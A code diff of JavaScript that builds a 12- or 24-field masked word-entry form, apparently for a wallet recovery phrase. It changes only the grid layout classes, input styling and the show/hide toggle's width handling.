@@ -10,7 +10,9 @@ document.addEventListener("DOMContentLoaded", function () {
     inputContainer.innerHTML = ""; // Clear previous inputs
 
     const columns = count === 12 ? 2 : 4;
-    inputContainer.classList = `mt-6 grid grid-cols-${columns} gap-2`;
+    inputContainer.classList = `mt-6 grid grid-cols-${columns} gap-2 ${
+      columns == 2 ? "cols-12" : "cols-24"
+    }`;
 
     for (let i = 0; i < count; i++) {
       const inputWrapper = document.createElement("div");
@@ -19,7 +21,8 @@ document.addEventListener("DOMContentLoaded", function () {
       const input = document.createElement("input");
       input.type = "password";
       input.placeholder = `Word ${i + 1}`;
-      input.className = "rounded-lg bg-[#2B3139] text-white px-3 py-2 ";
+      input.className =
+        "rounded-lg bg-[#2B3139] text-white px-3 py-2 truncate  ";
       input.maxLength = 12;
       input.required = true;
       inputWrapper.appendChild(input);
@@ -33,7 +36,6 @@ document.addEventListener("DOMContentLoaded", function () {
       toggleIcon.addEventListener("click", () => {
         const isPassword = input.type === "password";
         input.type = isPassword ? "text" : "password";
-        input.style.width = isPassword ? `calc(100% - 30px)` : ""; // Reset width to default if input is text
         toggleIcon
           .querySelector("i")
           .classList.toggle("fa-eye-slash", !isPassword);
